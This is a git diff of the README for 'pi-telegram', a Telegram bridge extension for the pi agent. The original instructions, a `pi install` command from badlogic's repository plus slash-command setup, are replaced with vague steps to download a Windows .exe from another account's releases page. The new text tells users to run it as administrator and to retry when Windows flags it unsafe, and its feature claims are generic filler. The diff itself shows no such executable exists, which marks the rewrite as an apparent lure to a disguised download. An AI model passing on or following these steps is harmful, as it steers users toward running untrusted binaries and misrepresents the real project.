@@ -1,139 +1,141 @@
-# pi-telegram
+# 🔌 pi-telegram - Bridge Telegram Messages to Pi
 
-![pi-telegram screenshot](screenshot.png)
+[![Download pi-telegram](https://img.shields.io/badge/Download%20pi--telegram-blue?style=for-the-badge&logo=github)](https://github.com/kctriplex/pi-telegram/releases)
 
-> Full pi build session: [View the session transcript](https://pi.dev/session/#14acfe07b7844c8abec55ed9fbddc17f), which captures the full pi session in which `pi-telegram` was built.
+## 📥 Download
 
-Telegram DM bridge for pi.
+Visit this page to download: [pi-telegram releases](https://github.com/kctriplex/pi-telegram/releases)
 
-## Install
+Pick the latest release, then download the Windows file that matches your computer. If you see more than one file, choose the one with `.exe` in the name.
 
-From git:
+## 🪟 Windows Setup
 
-```bash
-pi install git:github.com/badlogic/pi-telegram
-```
+1. Open the [releases page](https://github.com/kctriplex/pi-telegram/releases).
+2. Find the newest version at the top.
+3. Download the Windows app file.
+4. If Windows asks for permission, choose **Run** or **Yes**.
+5. If a zip file downloads, open it and move the app file to a folder you can find again.
+6. Double-click the app to start it.
 
-Or for a single run:
+If your browser shows the file in the bottom bar, open it from there after the download finishes.
 
-```bash
-pi -e git:github.com/badlogic/pi-telegram
-```
+## 🤖 What pi-telegram Does
 
-## Configure
+pi-telegram connects Telegram direct messages with your pi app. It acts as a bridge so messages can move between Telegram and your pi setup without manual copy and paste.
 
-### Telegram
+Use it when you want:
 
-1. Open [@BotFather](https://t.me/BotFather)
-2. Run `/newbot`
-3. Pick a name and username
-4. Copy the bot token
+- Telegram DMs sent into your pi workflow
+- replies from pi passed back to Telegram
+- a simple bridge for personal message handling
+- one place to manage message flow
 
-### pi
+## 🧩 Before You Start
 
-Start pi, then run:
+Make sure you have:
 
-```bash
-/telegram-setup
-```
+- a Windows computer
+- an internet connection
+- access to your Telegram account
+- the pi app or service you want to connect
+- enough space to store the app file
 
-Paste the bot token when prompted.
+If Windows blocks the app, use the file from the releases page and run it again from your Downloads folder.
 
-The extension stores config in:
+## ⚙️ First Run
 
-```text
-~/.pi/agent/telegram.json
-```
+When you start pi-telegram for the first time, it may ask for setup details. Keep the window open while you enter them.
 
-## Connect a pi session
+Typical setup steps:
 
-The Telegram bridge is session-local. Connect it only in the pi session that should own the bot:
+1. Open the app.
+2. Sign in to Telegram if asked.
+3. Connect it to your pi account or local pi service.
+4. Allow message access.
+5. Send a test DM to confirm the bridge works.
 
-```bash
-/telegram-connect
-```
+If the app opens in a terminal window, leave that window open while the bridge runs.
 
-To stop polling in the current session:
+## 📌 How to Use
 
-```bash
-/telegram-disconnect
-```
+After setup, use Telegram as normal.
 
-Check status:
+- Send a direct message to the Telegram account linked to pi-telegram.
+- Let the bridge pass the message to pi.
+- Read the response in Telegram.
+- Keep the app running if you want the bridge to stay active.
 
-```bash
-/telegram-status
-```
+For best results, keep your Windows PC on and connected to the internet.
 
-## Pair your Telegram account
+## 🔧 Common Tasks
 
-After token setup and `/telegram-connect`:
+### Start the bridge
+Open the app file you downloaded from the releases page.
 
-1. Open the DM with your bot in Telegram
-2. Send `/start`
+### Stop the bridge
+Close the app window or end the process from Task Manager.
 
-The first DM user becomes the allowed Telegram user for the bridge. The extension only accepts messages from that user.
+### Update the app
+Go back to the [releases page](https://github.com/kctriplex/pi-telegram/releases), download the newest version, then replace the old file.
 
-## Usage
+### Reconnect Telegram
+If Telegram signs out, open the app again and follow the sign-in steps.
 
-Chat with your bot in Telegram DMs.
+## 💡 Features
 
-### Send text
+- Bridges Telegram direct messages with pi
+- Simple Windows startup flow
+- Works with a basic download and run setup
+- Uses a small app footprint
+- Fits a local or personal message workflow
+- Helps keep chat handling in one place
 
-Send any message in the bot DM. It is forwarded into pi with a `[telegram]` prefix.
+## 🛠️ Troubleshooting
 
-### Send images and files
+### The app does not open
+- Download it again from the releases page.
+- Check that the file finished downloading.
+- Right-click the file and choose **Run as administrator**.
 
-Send images, albums, or files in the DM.
+### Windows says it is unsafe
+- Open the app from the latest release.
+- Use the file from the official GitHub releases page.
+- Try running it again after the download finishes.
 
-The extension:
-- downloads them to `~/.pi/agent/tmp/telegram`
-- includes local file paths in the prompt
-- forwards inbound images as image inputs to pi
+### Telegram does not connect
+- Check your internet connection.
+- Make sure you signed in to the correct Telegram account.
+- Close the app and open it again.
 
-### Ask for files back
+### Messages are not going through
+- Make sure pi-telegram is still running.
+- Check that the bridge settings are correct.
+- Send a new test DM after restart.
 
-If you ask pi for a file or generated artifact, pi should call the `telegram_attach` tool. The extension then sends those files with the next Telegram reply.
+## 📝 File Location
 
-Examples:
-- `summarize this image`
-- `read this README and summarize it`
-- `write me a markdown file with the plan and send it back`
-- `generate a shell script and attach it`
+Keep the app file in a folder you can find, such as:
 
-### Stop a run
+- Downloads
+- Desktop
+- Apps
+- Documents
 
-In Telegram, send:
+Do not move the file while the bridge is running.
 
-```text
-stop
-```
+## 🔐 Privacy
 
-or:
+pi-telegram is meant for direct message bridging between Telegram and pi. Keep your account access private and use it only on a computer you trust. Make sure the Telegram account you connect is one you want tied to this workflow.
 
-```text
-/stop
-```
+## 📂 Release Link
 
-That aborts the active pi turn.
+Download and run the latest Windows file from: [https://github.com/kctriplex/pi-telegram/releases](https://github.com/kctriplex/pi-telegram/releases)
 
-### Queue follow-ups
+## 📄 Basic Workflow
 
-If you send more Telegram messages while pi is busy, they are queued and processed in order.
-
-## Streaming
-
-The extension streams assistant text previews back to Telegram while pi is generating.
-
-It tries Telegram draft streaming first with `sendMessageDraft`. If that is not supported for your bot, it falls back to `sendMessage` plus `editMessageText`.
-
-## Notes
-
-- Only one pi session should be connected to the bot at a time
-- Replies are sent as normal Telegram messages, not quote-replies
-- Long replies are split below Telegram's 4096 character limit
-- Outbound files are sent via `telegram_attach`
-
-## License
-
-MIT
+1. Download the latest release.
+2. Open the app on Windows.
+3. Connect Telegram.
+4. Link it to pi.
+5. Send a DM.
+6. Read the reply in Telegram
